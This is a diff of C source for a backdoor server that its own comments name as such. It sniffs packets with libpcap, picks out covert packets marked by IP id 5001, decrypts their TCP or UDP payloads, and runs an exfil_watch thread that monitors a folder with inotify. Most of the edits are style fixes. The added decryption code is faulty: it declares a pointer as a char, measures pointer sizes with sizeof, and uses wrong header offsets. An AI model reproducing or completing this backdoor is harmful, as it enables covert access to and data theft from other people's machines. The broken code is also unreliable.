@@ -91,14 +91,14 @@ void pkt_handler(u_char *user, const struct pcap_pkthdr *pkt_info,
 	size_ip = iphdr->ihl * 4;
 
 	// check to see if the packet is complete
-	if(size_ip < sizeof(struct iphdr))
+	if (size_ip < sizeof(struct iphdr))
 		error("pkt_handler(): Truncated IP Header");
 
 	// check if the packet is intended for the backdoor server
 	if (iphdr->id != 5001)
 		return;
 
-	switch(iphdr->protocol) {
+	switch (iphdr->protocol) {
 	case IPPROTO_TCP:
 		handle_tcp(user, pkt_info, packet);
 		break;
@@ -110,43 +110,54 @@ void pkt_handler(u_char *user, const struct pcap_pkthdr *pkt_info,
 }
 
 void handle_tcp(u_char *user, const struct pcap_pkthdr *pkt_info,
-		const u_char *packet){
+		const u_char *packet) {
 	struct tcphdr* tcphdr;
 	struct iphdr* iphdr;
 	int size_tcp, ip_len;
-	char *tcp_payload;
+	char *tcp_payload, decrypt_payload;
 
 	iphdr = (struct iphdr*) (packet + sizeof(struct ether_header));
 	ip_len = iphdr->ihl * 4;
 
-	tcphdr = (struct tcphdr*)(packet + ip_len);
+	tcphdr = (struct tcphdr*) (packet + ip_len);
 	size_tcp = tcphdr->doff * 4;
 
-	if(size_tcp < 20)
+	if (size_tcp < 20)
 		error("handle_tcp(): invalid TCP size");
 
 	// retrieves the TCP payload
-	tcp_payload = (char *)(packet + ip_len + size_tcp);
+	tcp_payload = (char *) (packet + ip_len + size_tcp);
+
+	decrypt_payload = malloc(sizeof(tcp_payload));
+
+	// decrypt the payload and copy it into decrypt_payload variable.
+	memcpy(decrypt_payload, decrypt(), sizeof(tcp_payload));
 }
 
 void handle_udp(u_char *user, const struct pcap_pkthdr *pkt_info,
-		const u_char *packet){
+		const u_char *packet) {
 	struct udphdr* udphdr;
 	struct iphdr* iphdr;
 	int size_udp, ip_len;
-	char *udp_payload;
+	char *udp_payload, decrypt_payload;
 
 	iphdr = (struct iphdr*) (packet + sizeof(struct ether_header));
 	ip_len = iphdr->ihl * 4;
 
-	udphdr = (struct udphdr*)(iphdr + ip_len);
+	udphdr = (struct udphdr*) (iphdr + ip_len);
 	size_udp = sizeof(struct udphdr);
 
 	if (size_udp < 8)
 		error("handle_udp(): invalid UDP size");
 
 	// retrieves the UDP payload
-	udp_payload = (char *)(iphdr + ip_len + size_udp);
+	udp_payload = (char *) (iphdr + ip_len + size_udp);
+
+	// initialize the variable
+	decrypt_payload = malloc(sizeof(udp_payload));
+
+	// decrypt the payload and copy it into decrypt_payload variable.
+	memcpy(decrypt_payload, decrypt(), sizeof(udp_payload));
 }
 
 void *exfil_watch(void *arg) {
@@ -189,7 +200,7 @@ void *exfil_watch(void *arg) {
 		while (i < len) {
 			event = (struct inotify_event *) &buf[i];
 
-			if(event->len) {
+			if (event->len) {
 				char path[MAX_LEN];
 				strncpy(path, folder, MAX_LEN);
 				strcat(path, "/");
